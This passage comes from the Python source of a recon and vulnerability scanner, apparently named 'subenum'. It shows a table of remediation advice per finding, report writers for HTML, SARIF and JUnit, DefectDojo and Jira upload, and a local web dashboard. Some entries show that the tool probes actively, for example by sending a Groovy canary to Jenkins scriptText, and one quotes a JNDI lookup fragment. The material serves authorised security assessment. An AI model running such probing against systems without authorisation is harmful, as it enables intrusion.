    "BUCKET-OPEN": "public storage bucket - require auth, block public ACLs, rotate objects",
    "BUCKET": "bucket exists but is private - keep private and disable listing",
    "WAF": "WAF in front of this host - expect rate-limits and patch the WAF rules",
    "WS": "websocket reachable - require auth + origin checks on the upgrade handshake",
    "DIRLIST": "directory listing enabled - disable autoindex (Indexes off) or serve an index page",
    "DSSTORE": ".DS_Store leaked with directory entries - delete it, block dotfiles at the webserver",
    "SOURCEMAP": "JS source map exposed - keep .map files off production, strip sourceMappingURL comments",
    "BACKUP": "source/config backup served - remove backup copies from the webroot, deploy via CI",
    "ERRTRACE": "verbose stack trace on error - disable display_errors / DEBUG and log errors server-side",
    "CLICKJACK": "login form framable - add X-Frame-Options DENY/SAMEORIGIN or CSP frame-ancestors",
    "RATELIMIT": "no rate limit on auth endpoint - add per-account/IP throttling, CAPTCHA and lockouts",
    "AUTH-DEFAULT": "default credentials accepted - change them immediately and enforce strong passwords",
    "PHPUNIT-RCE": "phpunit eval-stdin.php executes the POST body (CVE-2017-9841) - delete vendor/phpunit from production webroots or block it at the webserver",
    "GHOSTCAT": "AJP/8009 reads WEB-INF files (CVE-2020-1938) - disable the AJP connector or bind it to localhost behind secret/requiredSecret",
    "SVC-LDAP": "LDAP accepts anonymous binds - require authenticated binds and ACL directory reads",
    "JWT-NONE-ACCEPT": "server accepts alg=none JWTs - reject unsigned tokens, enforce an explicit alg allowlist",
    "JWT-JWK": "JWT embeds its own verification key (jwk header) - never trust client-supplied JWKs, pin keys server-side",
    "SSRF-BYPASS": "URL fetch filter bypassed via alternate IP encodings - validate the resolved IP (not the string) against a loopback/link-local/metadata denylist",
    "SVC-RMI": "JRMP/RMI registry reachable unauthenticated - disable anonymous RMI, require SSL client auth, firewall the port",
    "GQL-COST": "GraphQL accepts unbounded query cost (alias bomb) - enforce depth/cost limits and reject oversized alias sets",
    "JWT-ALGCONF": "server accepts HS256 JWTs signed with its own TLS cert public key - enforce an explicit alg allowlist (RS256/ES256 only) and never use the public key as an HMAC secret",
    "LOG4J-LOOKUP": "server expands ${env:...} lookups in the User-Agent header - upgrade log4j/log4j2 to >= 2.17 and remove JndiLookup from the classpath; ${jndi:ldap://} would be RCE",
    "SHELL-EXEC": "live webshell executes shell commands at this path - remove it, rotate credentials/keys the host held, and audit the access logs for prior use",
    "JOLOKIA": "Jolokia JMX-over-HTTP agent exposed - disable the agent or bind it to localhost behind auth; MBean invoke is an RCE surface",
    "OAUTH-TOKEN-URL": "OAuth tokens travel in the query string of redirect chains - move tokens to the URL fragment or POST body and strip them from Referer via Referrer-Policy",
    "DEBUG-CONSOLE": "Werkzeug interactive debugger exposed at /console - disable debug mode in production; the PIN can be derived from public traceback values",
    "DEBUG-TOOLBAR": "Django debug toolbar exposed - restrict DEBUG_TOOLBAR to staff over VPN; it leaks SQL, settings and request internals",
    "CORS-REDIR": "redirect responses carry Access-Control-Allow-Origin: <origin> - restrict CORS to an explicit origin allowlist, do not reflect arbitrary Origins on 3xx hops",
    "TABNAB": "target=_blank links without rel=noopener enable reverse tabnabbing - add rel=\"noopener noreferrer\" to every external _blank link",
    "SVC-KAFKA": "Kafka answers ApiVersions without auth - enable SASL/ACLs on the broker and firewall 9092 from untrusted networks",
    "SVC-PROMETHEUS": "Prometheus /api/v1/targets is open - require auth/proxy in front of 9090; target labels leak the full internal service map",
    "SVC-NEO4J": "Neo4j REST API answers without auth - set dbms.security.auth_enabled=true and firewall 7474",
    "SVC-ACTIVEMQ": "ActiveMQ web console login is exposed - change the default admin:admin credential, disable the web console or bind it to localhost",
    "SVC-HADOOP": "Hadoop NameNode API is unauthenticated - enable HDFS authorization (hadoop.security.authorization) and firewall 9870/50070",
    "TOMCAT-DEFAULT": "Tomcat manager accepts factory-default credentials - change conf/tomcat-users.xml passwords immediately and restrict /manager by valve",
    "ACTUATOR": "Spring Boot actuator root lists every enabled endpoint - restrict /actuator to internal networks and disable unused endpoints (sensitive ones like env/heapdump must be off)",
    "OAUTH-PKCE": "authorization-code flow without PKCE - add code_challenge=S256 to the authorize URL and verify code_verifier on token exchange",
    "PHPINFO": "phpinfo() is publicly reachable - remove the page from production; it discloses env vars, credentials and build paths",
    "JENKINS-RCE": "Jenkins executes our Groovy canary via POST /scriptText - require Overall/RunScripts for anonymous users (or disable script console), rotate every credential the controller can reach",
    "CONSUL-KV": "Consul /v1/kv answers ?recurse without auth - enable ACLs (default deny), rotate all KV secrets and firewall 8500",
    "ETCD-KV": "etcd kv range answers without auth - enable client certificate auth (--client-cert-auth) and firewall 2379; rotate every secret it held",
    "GRAFANA-DATA": "Grafana /api/datasources is readable anonymously - disable anonymous access, enforce auth on /api and rotate datasource passwords",
    "MYSQL-EMPTY": "MySQL accepts login with an empty password - set strong passwords (ALTER USER ... IDENTIFIED BY), skip-grant-tables must be off, firewall 3306",
    "SVC-WEBLOGIC": "WebLogic T3/admin console exposed - firewall T3 (weblogic.security.net.ConnectionFilter), disable unused console, patch deserialization CVEs",
    "WP-USER-ENUM": "/?author=1 redirects to author archives leaking usernames - disable author queries (remove ?author= rewrite) or return 403 for /author/*",
    "OAUTH-IMPLICIT": "authorization flow uses response_type=token (implicit) - migrate to authorization-code flow with PKCE; implicit tokens live in URLs and leak",
    "API-DOCS": "OpenAPI/Swagger documentation is public - the full endpoint surface aids attackers; move docs behind auth or internal networks",
    "ACTUATOR-ENV": "/actuator/env exposes every config property - move actuator behind auth/network policy and disable env/configprops; rotate every credential it showed",
    "ACTUATOR-HEAPDUMP": "JVM heapdump is downloadable - live secrets and session tokens are in memory; disable the heapdump endpoint and rotate everything the JVM handled",
    "H2-CONSOLE": "H2 console reachable - CREATE ALIAS turns SQL into RCE; disable h2-console in production or bind it to localhost with auth",
    "ELMAH": "ELMAH error log public - stack traces leak connection strings and internals; require auth on elmah.axd and purge historical logs",
    "TRACE-AXD": "ASP.NET trace enabled - request details and headers are public; set <trace enabled=\"false\"> or restrict trace.axd by IP",
    "VAULT-MOUNTS": "Vault mount list readable without auth - enable Vault auth, seal unneeded engines and firewall 8200",
    "CONFIG-LEAK": "Spring Cloud Config returns property sources unauthenticated - put config-server behind auth and rotate every secret it serves",
    "NACOS-USERS": "Nacos user list readable unauthenticated - enable nacos.core.auth.enabled=true and rotate console passwords",
    "WP-REST-USERS": "WordPress REST /wp/v2/users enumerates accounts - restrict the endpoint (remove_item_permissions_check) or block /wp-json/wp/v2/users",
    "JENKINS-DEFAULT": "Jenkins accepts classic default credentials - change the admin password, disable any anonymous Overall/Read, enable security realm hardening",
    "JUPYTER-OPEN": "Jupyter API/terminals answer unauthenticated - interactive RCE on the host; require --NotebookApp.token on every bind address",
    "AIRFLOW-DAGS": "Airflow REST lists DAGs unauthenticated - enable webserver auth, restrict /api/v1 and rotate secrets embedded in DAG code",
    "ADMINER": "Adminer panel is public - remove it from production or front it with auth; rotate every credential it can use",
    "PMA-EXPOSED": "phpMyAdmin is reachable - move it behind VPN/auth and enforce strong database passwords",
    "SERVER-INFO": "Apache mod_info leaks build, modules and config - disable ServerInfo or deny /server-info by IP",
    "JBOSS-CONSOLE": "JBoss JMX console is public - secure the console with a login module and firewall the HTTP invoker interfaces",
    "JBOSS-INVOKER": "JBoss invoker returns serialized Java objects - remove JMXInvokerServlet/HTTPInvoker, patch deserialization CVEs (CVE-2017-12149)",
    "IMAP-EMPTY": "IMAP accepts an empty password for known users - disable empty-password logins (disable plaintext auth) and reset those accounts",
    "POP3-EMPTY": "POP3 accepts an empty password - disable empty-password AUTH and reset the mailbox passwords",
    "FTP-DEFAULT": "FTP accepts default credentials - change appliance/service accounts and disable unused FTP users",
    "REDIS-WEAK": "Redis AUTH accepts a default password - set a 32+ char requirepass and bind to localhost/private network",
    "RABBIT-DEFAULT": "RabbitMQ accepts the default guest:guest account - delete or rename guest and enforce strong user passwords",
    "AMQP-DEFAULT": "AMQP authenticates with default guest:guest - disable the guest user (loopback_users), create named users with strong passwords and per-vhost permissions",
    "MQTT-DEFAULT": "MQTT accepts default credentials - change factory accounts, disable anonymous access and require TLS client auth on the broker",
    "PG-DEFAULT": "PostgreSQL accepts a default password - set a strong password (ALTER USER ... PASSWORD), prefer scram-sha-256 and firewall 5432",
    "SMTP-DEFAULT": "SMTP AUTH accepts default credentials - change mailbox/service account passwords, require AUTH only after STARTTLS and rate-limit AUTH failures",
    "RATELIMIT-BYPASS": "rate limit is defeated by client-set X-Forwarded-For - trust proxy headers only from your edge and key limits on the authenticated account too",
    "FIREBASE-DB": "RTDB security rules allow public read - require auth in the rules (auth != null), audit and purge leaked data, rotate every secret the database held",
    "FIREBASE-STORAGE": "storage bucket lists objects without auth - require request.auth != null in the rules, disable public list/download and audit exposed files",
    "SQLI-FILE-READ": "SQL injection escalates to OS file read via LOAD_FILE/pg_read_file - parameterize queries, drop FILE privilege from the DB user, rotate exposed secrets",
    "WP-CONFIG-READABLE": "wp-config.php served as source - fix the PHP handler so .php executes, move config above the docroot and rotate DB/auth salts",
    "MASS-ASSIGN": "API stores attacker-supplied privileged fields - bind request payloads to an explicit allowlist of fields, never mass-assign role/is_admin from user input",
    "SPRAY-DEFAULT": "login accepts a default credential - remove/rotate default accounts, enforce strong passwords, add MFA and rate-limit per-account auth failures",
    "VNC-WEAK": "VNC accepts a weak/common password - set a strong session password or move to a TLS-tunneled SSH/RDP access path, firewall 5900",
    "SNMP-PUBLIC": "SNMP answers a default community over UDP - move to SNMPv3 with auth+priv, or change the community and restrict source IPs on 161/udp",
    "MEMCACHED-UDP": "Memcached answers UDP stats - disable UDP (-U 0), bind to localhost and firewall 11211 to prevent amplification and data exposure",
    "WP-PLUGIN-VER": "plugin version disclosed via readme.txt - hide/remove the readme and keep the plugin updated to the latest patched release",
    # ---- wave 21 ----
    "H2-DESYNC": "HTTP/2 request smuggling (CL.0/TE.0/content-length mismatch) - disable H2 on the frontend, normalize framing at the proxy, keep frontend/backend protocol-aligned",
    "H3-DOWNGRADE": "origin answers differently under forced HTTP/2 vs HTTP/1.1 - reconcile the backend responses and do not expose an H2-only internal origin",
    "WS-SMUGGL": "WebSocket frame-level desync - inspect frame boundaries at the proxy, reject oversized/ambiguous frames, keep H2/1.1 framing consistent",
    "DOWNGRADE": "sensitive form or session is served over http:// - force HTTPS (HSTS) and never fall back to plaintext on login or authenticated paths",
    "SESS-FIXATION": "session id accepted before login and survives authentication - rotate the session identifier on login and reject pre-set ids",
    "CSRF-MISSING": "state-changing endpoint has no CSRF token or SameSite protection - require a per-session anti-CSRF token and SameSite cookies",
    "BOLA-SWEEP": "object-level authorization is missing across id sequences - enforce per-object ownership/role checks server-side on every read/write",
    "METHOD-BYPASS": "HTTP method override (X-HTTP-Method-Override) reaches routes the base method is denied - ignore override headers or authorize them identically",
    "ATO-CHAIN": "OAuth/password-reset flaws chain into account takeover - fix the redirect/state/token handling and rotate affected credentials",
    "DESER": "insecure deserialization of untrusted data - validate allowlisted types, sign payloads, avoid native deserializers on user input",
    "RACE-CONF": "parallel duplicate requests are not serialized - add idempotency keys and server-side locks around state transitions",
    "BULK-EXPOSURE": "response returns far more fields than the request scoped - apply field-level allowlists and minimal projections on output",
    "JS-SUBTAKEOVER": "third-party script/CDN host is dangling - reclaim the subdomain or remove the DNS record and the script reference",
    "POSTMESSAGE-ORIGIN": "postMessage target/origin is wildcard or absent - validate event.origin against an allowlist before acting on messages",
    "PROTO-SINK": "prototype pollution reaches a dangerous gadget/sink - freeze prototypes, use null-prototype objects, block __proto__/constructor keys",
    "SSTI-CONFIRM": "template injection leads to confirmed code execution - sandbox the template engine and never evaluate user-controlled templates",
    "CSRF-STATE": "state-changing form relies only on cookies for CSRF defense - add synchronizer tokens and check Origin/Referer",
    "SESSION-ROTATION": "session is not rotated across privilege changes - issue a fresh session id on login/escalation to block fixation",
    "SPRAY-KNOWN": "login accepts a known/stolen credential - force a password reset, rotate the credential, enforce MFA and rate-limit per-account auth failures",
    "BIZ-PRICE": "server trusts client-supplied price/quantity - recompute price and totals server-side, never accept price/amount from the client",
    "BIZ-COUPON": "discount/coupon can be reused or applied more than the allowed count - validate coupon state server-side and enforce single-use / per-account limits",
    "BIZ-WORKFLOW": "state transition can be skipped or replayed (payment/verification bypass) - enforce the full ordered workflow server-side and reject out-of-order transitions",
    "BIZ-QUOTA": "per-account limit/quota can be exceeded via parameter tampering - enforce quota server-side and ignore client-supplied limit/credit/remaining fields",
    "TRACK": "the TRACK verb is enabled and echoes request headers (XST token theft) - disable TRACK at the web server/proxy (e.g. IIS RemoveVerbHandlers)",
    "DEBUG-METHOD": "the DEBUG verb is enabled and echoes the request (IIS/ASP info leak) - remove DEBUG from allowed HTTP verbs at the server/proxy",
    "SEARCH-ALLOWED": "WebDAV SEARCH/DASL is enabled and enumerates the content index - disable the SEARCH verb unless the application requires it",
    "MKCOL-ALLOWED": "WebDAV MKCOL creates collections unauthenticated (write-class foothold) - disable MKCOL/PUT/MOVE at the edge or require authentication + authorization",
    "MOVE-ALLOWED": "WebDAV MOVE renames resources unauthenticated - disable MOVE/COPY at the edge or require authentication + per-resource authorization",
    "CONNECT-PROXY": "the server accepts CONNECT and will tunnel arbitrary destinations (open proxy) - block CONNECT at the reverse proxy except for explicitly trusted upstreams",
    "LLM-ENDPOINT": "an OpenAI-compatible inference API is reachable - require authentication (API keys), network-restrict the endpoint and keep it behind the gateway",
    "LLM-OPEN": "the model accepts unauthenticated completions (cost/abuse/data-leak risk) - enforce API-key auth + rate limits on /v1/chat/completions and audit usage",
}


def remediation(tag):
    """one-line fix advice for a finding tag ('' = none / informational)."""
    if tag in REMEDIATION:
        return REMEDIATION[tag]
    if tag.startswith("CVE"):
        return "upgrade the affected component to a patched version"
    if tag.startswith("NUCLEI"):
        return "review and remediate the matched template finding"
    if tag.startswith("PARAM"):
        return "validate / encode user input server-side (allowlists)"
    if tag.startswith("DIR"):
        return "restrict access to sensitive paths (auth / IP allowlist)"
    if tag.startswith("TAKEOVER"):
        return "verify ownership and remove the dangling DNS record"
    if tag.startswith(("CERT", "TLS", "WEAK")):
        return "harden TLS: modern protocols / ciphers, valid renewed certificate"
    return ""


def write_report(path, domains, live, probes, cname, findings, port_results, all_paths,
                 crawl_pairs, elapsed):
    fs = sorted(set(findings))
    order = ["critical", "high", "medium", "low", "info"]
    groups = {s: [f for f in fs if sev(f) == s] for s in order}
    cnt = Counter(sev(f) for f in fs)
    def esc(x):
        return html.escape(str(x))
    tiles = "".join(
        f'<div class="tile {s}"><b>{cnt.get(s,0)}</b><span>{s}</span></div>' for s in order)

    # findings by type: tag, severity, count, remediation
    tag_cnt = Counter(ftag(f) or "?" for f in fs)
    trows = ""
    for tag, c in tag_cnt.most_common():
        s = SEV.get(tag, "info")
        trows += (f"<tr><td class='{s}'>[{esc(tag)}]</td><td>{s}</td><td>{c}</td>"
                  f"<td class='hint'>{esc(remediation(tag))}</td></tr>")

    # severity sections, findings grouped per tag with one remediation line each
    fblocks = ""
    for s in order:
        if not groups[s]:
            continue
        fblocks += f'<h3 class="{s}">{s} ({len(groups[s])})</h3>'
        by_tag = {}
        for f in groups[s]:
            by_tag.setdefault(ftag(f) or "?", []).append(f)
        for tag in sorted(by_tag, key=lambda t: (-len(by_tag[t]), t)):
            items = "".join(f"<li>{esc(f)}</li>" for f in sorted(by_tag[tag]))
            hint = remediation(tag)
            h = f'<div class="hint">&#8627; {esc(hint)}</div>' if hint else ""
            fblocks += (f'<div class="taggrp"><b>[{esc(tag)}]</b> x{len(by_tag[tag])}'
                        f"{h}<ul>{items}</ul></div>")

    # per-host grouping, most severe host first
    by_host = {}
    for f in fs:
        by_host.setdefault(finding_host(f), []).append(f)
    hblocks = ""
    ranked = sorted((h for h in by_host if h),
                    key=lambda h: (min(order.index(sev(x)) for x in by_host[h]), h))
    for h in ranked + ([""] if "" in by_host else []):
        items = sorted(by_host[h])
        worst = order[min(order.index(sev(x)) for x in items)]
        label = h or "other / unscoped"
        lis = "".join(
            f'<li><b class="{sev(x)}">[{esc(ftag(x))}]</b> '
            f'{esc(x.split("]", 1)[1].strip() if "]" in x else x)}</li>'
            for x in items)
        hblocks += (f'<details><summary><span class="sevdot {worst}"></span>'
                    f'{esc(label)} ({len(items)})</summary><ul>{lis}</ul></details>')

    hrows = ""
    for h in sorted(live):
        i = probes.get(h, {})
        hrows += (f"<tr><td>{esc(h)}</td><td>{esc(','.join(live[h]))}</td>"
                  f"<td>{i.get('status','')}</td><td>{esc(i.get('title',''))}</td>"
                  f"<td>{esc(' '.join(i.get('tech', [])))}</td>"
                  f"<td>{esc(cname.get(h, ''))}</td></tr>")
    prows = "".join(f"<tr><td>{esc(h)}</td><td>{p}</td><td>{esc(b)}</td></tr>"
                    for h, p, b in port_results)
    doc = f"""<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>subenum report - {esc(', '.join(domains))}</title>
<style>
body{{font:14px/1.5 system-ui,Segoe UI,sans-serif;margin:24px;background:#0d1117;color:#c9d1d9}}
h1,h2,h3{{color:#e6edf3}} a{{color:#58a6ff}}
.tiles{{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}}
.tile{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:10px 16px;min-width:90px;text-align:center}}
.tile b{{display:block;font-size:24px}} .tile span{{color:#8b949e;font-size:11px}}
.critical b,.critical{{color:#f85149}} .high b,.high{{color:#db6d28}}
.medium b,.medium{{color:#d29922}} .low b,.low{{color:#3fb950}}
.info b,.info{{color:#58a6ff}}
table{{border-collapse:collapse;width:100%;font-size:12px;margin:8px 0}}
th,td{{border:1px solid #30363d;padding:4px 8px;text-align:left}}
th{{background:#161b22;position:sticky;top:0}}
ul{{margin:4px 0 16px}} li{{font-family:Consolas,monospace;font-size:12px}}
h3.critical{{color:#f85149}} h3.high{{color:#db6d28}} h3.medium{{color:#d29922}}
h3.low{{color:#3fb950}} h3.info{{color:#58a6ff}}
.hint{{color:#8b949e;font-size:12px;font-style:italic;margin:2px 0 4px}}
.taggrp{{margin:6px 0 12px}}
details{{margin:4px 0;border:1px solid #30363d;border-radius:6px;padding:4px 10px;background:#161b22}}
summary{{cursor:pointer;font-family:Consolas,monospace}}
.sevdot{{display:inline-block;width:9px;height:9px;border-radius:50%;margin-right:8px;background:#58a6ff}}
.sevdot.critical{{background:#f85149}} .sevdot.high{{background:#db6d28}}
.sevdot.medium{{background:#d29922}} .sevdot.low{{background:#3fb950}}
</style></head><body>
<h1>subenum recon report</h1>
<p>targets: <b>{esc(', '.join(domains))}</b> | generated {time.strftime('%Y-%m-%d %H:%M:%S')}
 | elapsed {elapsed:.0f}s<br>cmd: <code>{esc(' '.join(sys.argv))}</code></p>
<div class="tiles">{tiles}</div>
<p>{len(live)} live hosts | {len(all_paths)} endpoints | {len(crawl_pairs)} crawl pairs
 | {len(port_results)} open ports | {len(fs)} findings</p>
<h2>Findings by type</h2>
<table><tr><th>tag</th><th>severity</th><th>count</th><th>remediation</th></tr>
{trows or '<tr><td colspan=4>none</td></tr>'}</table>
<h2>Findings</h2>{fblocks or '<p>none</p>'}
<h2>Findings by host</h2>{hblocks or '<p>none</p>'}
<h2>Open ports</h2><table><tr><th>host</th><th>port</th><th>banner</th></tr>{prows or '<tr><td colspan=3>none</td></tr>'}</table>
<h2>Hosts</h2><table><tr><th>host</th><th>ip</th><th>status</th><th>title</th><th>tech</th><th>cname</th></tr>{hrows or '<tr><td colspan=6>none</td></tr>'}</table>
</body></html>"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(doc)


# ---------------- main ----------------
async def findings_flusher(findings, path, stop, interval=15):
    """periodically write findings so interrupted runs keep partial results."""
    last = None
    try:
        while not stop[0]:
            await asyncio.sleep(interval)
            snap = "\n".join(sorted(set(findings))) + "\n"
            if snap != last:
                last = snap
                with open(path, "w", encoding="utf-8") as f:
                    f.write(snap)
    except (asyncio.CancelledError, OSError):
        pass


SARIF_LEVEL = {"critical": "error", "high": "error", "medium": "warning",
               "low": "note", "info": "note"}
# GitHub only accepts error/warning/recommendation for problem.severity and
# treats security-severity >= 9.0 as critical (7.0-8.9 = high)
SARIF_GHSEV = {"critical": "error", "high": "error", "medium": "warning",
               "low": "recommendation", "info": "recommendation"}
SARIF_SECSEV = {"critical": "9.8", "high": "7.5", "medium": "5.0",
                "low": "3.0"}


def write_sarif(path, findings, targets):
    fs = sorted(set(findings))
    rules, ridx, results = [], {}, []
    for f in fs:
        tag = ftag(f)
        if tag not in ridx:
            s = sev(f)
            ridx[tag] = len(rules)
            props = {"problem.severity": SARIF_GHSEV.get(s, "recommendation"),
                     "subenum.severity": s}
            if s in SARIF_SECSEV:
                props["security-severity"] = SARIF_SECSEV[s]
            rules.append({
                "id": tag, "name": tag,
                "shortDescription": {"text": remediation(tag) or f"subenum {tag}"},
                "fullDescription": {"text": remediation(tag) or f"subenum {tag}"},
                "defaultConfiguration": {"level": SARIF_LEVEL.get(s, "note")},
                "properties": props,
            })
        host = finding_host(f) or (targets[0] if targets else "") or "n/a"
        results.append({
            "ruleId": tag, "ruleIndex": ridx[tag],
            "level": rules[ridx[tag]]["defaultConfiguration"]["level"],
            "message": {"text": f},
            "locations": [{"physicalLocation":
                           {"artifactLocation": {"uri": host}}}],
        })
    doc = {"$schema": "https://json.schemastore.org/sarif-2.1.0.json",
           "version": "2.1.0",
           "runs": [{"tool": {"driver": {"name": "subenum", "version": "9",
                                         "rules": rules}},
                     "results": results}]}
    with open(path, "w", encoding="utf-8") as f:
        json.dump(doc, f, indent=1)
    return path


def write_junit(path, findings):
    fs = sorted(set(findings))
    n = max(len(fs), 1)
    suites = ET.Element("testsuites", name="subenum",
                        tests=str(n), failures=str(len(fs)))
    ts = ET.SubElement(suites, "testsuite", name="subenum.recon",
                       tests=str(n), failures=str(len(fs)))
    if not fs:
        ET.SubElement(ts, "testcase", classname="subenum", name="no-findings")
    for f in fs:
        f = re.sub(r"[\x00-\x08\x0b\x0c\x0e-\x1f]", "", f)  # XML 1.0-illegal
        tc = ET.SubElement(ts, "testcase", classname="subenum", name=f[:200])
        fail = ET.SubElement(tc, "failure", message=f"{sev(f)}: {f[:300]}")
        fail.text = remediation(ftag(f)) or f"subenum {ftag(f)}"
    ET.ElementTree(suites).write(path, encoding="utf-8", xml_declaration=True)
    return path


_DD_SEV = {"critical": "Critical", "high": "High", "medium": "Medium",
           "low": "Low", "info": "Info"}
_JIRA_PRIO = {"critical": "Highest", "high": "High", "medium": "Medium",
              "low": "Low", "info": "Lowest"}


async def dd_upload(a, domains, findings):
    """DefectDojo import: auto-create an engagement (unless given) and POST a
    Generic Findings Import CSV. upload problems print, never fail the scan."""
    url, tok = (a.dd_url or "").rstrip("/"), a.dd_token
    fs = sorted({str(x) for x in findings})
    if not url or not tok or not a.dd_product or not fs:
        return
    hdr = {"Authorization": f"Token {tok}"}
    eng, date = a.dd_engagement, time.strftime("%Y-%m-%d")
    try:
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            if not eng:
                async with s.post(f"{url}/api/v2/engagements/", headers=hdr,
                                  json={
                                      "name": f"subenum {date} "
                                              f"({', '.join(domains[:3])})",
                                      "product": a.dd_product,
                                      "status": "Not Started",
                                      "engagement_type": "Technical",
                                      "target_start": date,
                                      "target_end": date}) as r:
                    if r.status >= 300:
                        print(f"[!] DefectDojo engagement create -> {r.status}",
                              flush=True)
                        return
                    eng = (await r.json()).get("id")
            rows = ["title,severity,description"]
            for x in fs:
                m = re.match(r"\[([A-Z0-9][A-Z0-9-]*)\]", x)
                rem = remediation(m.group(1) if m else "")
                desc = x + (f"\\n\\nRemediation: {rem}" if rem else "")
                rows.append(f'"{x.replace(chr(34), chr(34) * 2)}",'
                            f'"{_DD_SEV.get(sev(x), "Low")}",'
                            f'"{desc.replace(chr(34), chr(34) * 2)}"')
            form = aiohttp.FormData()
            form.add_field("file", ("\r\n".join(rows) + "\r\n").encode(),
                           filename="subenum_findings.csv",
                           content_type="text/csv")
            form.add_field("scan_type", "Generic Findings Import")
            form.add_field("product", str(a.dd_product))
            if eng:
                form.add_field("engagement", str(eng))
            async with s.post(f"{url}/api/v2/imports/", headers=hdr,
                              data=form) as r:
                if r.status < 300:
                    print(f"[+] DefectDojo: {len(fs)} finding(s) imported "
                          f"into engagement {eng}", flush=True)
                else:
                    print(f"[!] DefectDojo import -> {r.status}", flush=True)
    except Exception as e:
        record_error("defectdojo", f"upload failed: {str(e)[:160]}")
        print(f"[!] DefectDojo upload failed: {str(e)[:160]}", flush=True)


async def jira_upload(a, findings):
    """Jira issues for findings (critical/high first, capped by --jira-limit).
    upload problems print, never fail the scan."""
    url = (a.jira_url or "").rstrip("/")
    if not url or not (a.jira_user and a.jira_token and a.jira_project):
        return
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
    fs = sorted({str(x) for x in findings},
                key=lambda x: order.get(sev(x), 4))[:max(1, a.jira_limit)]
    if not fs:
        return
    auth = "Basic " + base64.b64encode(
        f"{a.jira_user}:{a.jira_token}".encode()).decode()
    ok = bad = 0
    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(timeout=timeout) as s:
            for x in fs:
                m = re.match(r"\[([A-Z0-9][A-Z0-9-]*)\]", x)
                rem = remediation(m.group(1) if m else "")
                async with s.post(
                        f"{url}/rest/api/2/issue",
                        headers={"Authorization": auth,
                                 "Content-Type": "application/json"},
                        json={"fields": {
                            "project": {"key": a.jira_project},
                            "summary": f"[subenum] {x[:118]}",
                            "description": (x + (f"\n\nRemediation: {rem}"
                                                 if rem else ""))[:30000],
                            "issuetype": {"name": "Bug"},
                            "priority": {"name": _JIRA_PRIO.get(sev(x), "Low")},
                            "labels": ["subenum"]}}) as r:
                    if r.status < 300:
                        ok += 1
                    else:
                        bad += 1
        print(f"[+] Jira: {ok} issue(s) created in {a.jira_project}"
              + (f", {bad} failed" if bad else ""), flush=True)
    except Exception as e:
        record_error("jira", f"upload failed: {str(e)[:160]}")
        print(f"[!] Jira upload failed: {str(e)[:160]}", flush=True)


def diff_baseline(old, hosts_now, findings_now):
    oh = ({h.get("host") for h in old["hosts"] if isinstance(h, dict)
           and h.get("host")} if isinstance(old.get("hosts"), list) else set())
    of = ({x for x in old["findings"] if isinstance(x, str)}
          if isinstance(old.get("findings"), list) else set())
    hs, fs = list(hosts_now), list(findings_now)
    return {"new_hosts": [h for h in hs if h not in oh],
            "new_findings": [f for f in fs if f not in of],
            "gone_hosts": sorted(oh - set(hs)),
            "gone_findings": sorted(of - set(fs))}


async def send_webhook(url, payload, timeout=10):
    try:
        async with xsession() as s:
            async with s.post(url, json=payload,
                              timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                body = (await r.text())[:160]
                print(f"[webhook] POST {url} -> {r.status} {body}", flush=True)
                return r.status < 300
    except Exception as e:
        record_error("webhook", f"POST {url} failed: {e}")
        print(f"[webhook] POST {url} failed: {e}", flush=True)
        return False


# ---------------- web UI: local dashboard (targets in browser, live progress, results) ----------
import threading

_REAL_PRINT = print
_WEB_TEE = [False]
WEB_FILES = ("subdomains.txt", "subdomains_links.txt", "subdomains_endpoints.txt",
             "subdomains_crawl.txt", "subdomains_ports.txt", "subdomains_findings.txt",
             "subdomains_dirs.txt", "subdomains_vhosts.txt", "subdomains_surface.txt",
             "subdomains.json", "subdomains_report.html", "subdomains.sarif",
             "subdomains_junit.xml", "subdomains_diff.txt", "subdomains_graphql.txt")
WEB_PHASES = (("1", "passive OSINT"), ("2", "DoH brute"), ("3", "verify"),
              ("4", "dns + tls"), ("4b", "reverse DNS"), ("5", "http probe"),
              ("6-8", "crawl | ports | wayback"), ("9", "secrets"),
              ("10", "takeover"), ("11-14", "dirs | vhost | api | methods"),
              ("15", "surface + CVE"), ("16-18", "active scans"), ("19", "nuclei"))
_WEB_OPT_FLAGS = (("brute", "--nobrute"), ("wayback", "--no-wayback"),
                  ("ports", "--no-ports"), ("dirs", "--no-dirs"),
                  ("crawl", "--no-crawl"), ("secrets", "--no-secrets"),
                  ("params", "--no-params"), ("nuclei", "--no-nuclei"),
                  ("buckets", "--no-buckets"), ("methods", "--no-methods"),
                  ("api", "--no-api"), ("vhost", "--no-vhost"),
                  ("cve", "--no-cve"), ("tls", "--no-tlsscan"),
                  ("ws", "--no-ws"), ("smuggle", "--no-smuggle"),
                  ("mine", "--no-mine"), ("files", "--no-files"),
                  ("sweep", "--no-sweep"), ("reverse", "--no-reverse"),
                  ("asn", "--no-asn"),
                  ("takeover", "--no-takeover"), ("probe", "--no-probe"),
                  ("dns", "--no-dns"), ("axfr", "--no-axfr"),
                  ("userenum", "--no-userenum"), ("putdel", "--no-putdel"),
                  ("smtp", "--no-smtp"), ("mailsec", "--no-mailsec"),
                  ("nsecwalk", "--no-nsecwalk"))


class WebBus:
    """thread-safe bridge: scan worker (prints, counters) -> aiohttp web loop."""
    def __init__(self):
        self.reset()

    def reset(self):
        self.lines = deque(maxlen=6000)        # (n, text)
        self.nlines = 0
        self.running = False
        self.done = False
        self.exit = None
        self.targets = ""
        self.argv = []
        self.started = self.ended = 0.0
        self.phase_idx = -1
        self.phase_tok = self.phase_name = ""
        self.frac = 0.0
        self.progress = 0.0
        self.probes = {}
        self.sevsrc = None
        self.active = False
        self.runner = None

    def attach(self, probes, sevsrc=None):
        self.probes = probes
        if sevsrc:
            self.sevsrc = sevsrc

    def push(self, line):
        line = str(line)
        self.nlines += 1
        self.lines.append((self.nlines, line))
        m = re.match(r"\s*\[(\d+[a-z]?)(?:-(\d+))?\s*/\s*19\]\s*(.*)", line)
        if m:
            tok = m.group(1) + (f"-{m.group(2)}" if m.group(2) else "")
            for i, (t, name) in enumerate(WEB_PHASES):
                if t == tok:
